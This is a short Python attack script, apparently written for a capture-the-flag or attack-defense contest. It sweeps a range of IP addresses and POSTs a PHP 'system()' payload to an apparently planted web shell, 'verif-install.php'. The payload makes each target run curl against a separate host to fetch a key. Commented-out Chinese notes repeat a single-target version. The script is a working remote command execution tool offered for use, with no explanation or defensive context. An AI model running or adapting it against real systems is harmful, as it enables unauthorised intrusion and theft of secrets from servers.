import requests

payload = {"a":'system("curl -k https://10.100.166.106/Getkey/index/index");'}
urladd = '/app/webroot/verif-install.php'
urlheader = 'http://'
for i in range(8,24,3):
    ip = '3.1.254.'
    ip = ip + str(i)
    # ip = '3.1.254.17'
    url = urlheader + ip + urladd
    # print(url)
    try:
        res = requests.post(url, data=payload)
        res = res.text
        print(res)
    except:
        print(end='')
    # res = requests.post(url, data=payload)
    # print(res.text)




# import requests
# # 请求url
# url = "http://3.1.254.17/app/webroot/verif-install.php"
# # 请求参数
#
# # form表单形式，参数用data
# res = requests.post(url, data=payload)
# print(res.text)